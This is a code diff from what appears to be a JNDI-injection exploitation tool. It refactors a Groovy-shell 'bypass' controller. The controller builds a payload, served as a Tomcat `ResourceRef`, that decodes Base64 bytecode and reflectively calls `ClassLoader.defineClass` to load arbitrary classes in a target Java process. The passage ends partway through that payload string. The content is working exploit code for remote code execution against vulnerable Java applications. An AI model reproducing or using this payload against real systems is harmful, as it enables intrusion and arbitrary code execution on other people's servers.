@@ -1,8 +1,8 @@
-package map.jndi.controller;
+package map.jndi.controller.bypass;
 
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
-import map.jndi.bean.ClassBean;
+import map.jndi.controller.BasicController;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
@@ -12,8 +12,8 @@ import java.util.Base64;
 @JNDIMapping("/GroovyShell")
 public class GroovyShellController extends BasicController {
     @Override
-    public Object process(ClassBean classBean) {
-        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(classBean.getData()) + "');" +
+    public Object process(byte[] byteCode) {
+        String code = "var bytes = java.util.Base64.getDecoder().decode('" + Base64.getEncoder().encodeToString(byteCode) + "');" +
                 "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                 "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                 "method.setAccessible(true);" +
